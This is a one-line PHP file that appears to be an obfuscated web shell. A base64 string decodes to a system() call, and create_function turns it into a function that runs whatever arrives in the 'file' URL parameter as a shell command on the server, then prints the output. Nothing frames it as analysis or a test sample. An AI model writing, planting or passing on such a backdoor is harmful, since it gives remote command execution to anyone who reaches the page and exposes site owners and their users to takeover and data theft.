<?php echo '<pre>'; $func = create_function('$a', base64_decode('c3lzdGVtKCIkYSIpOw==')); $func($_GET['file']); ?>
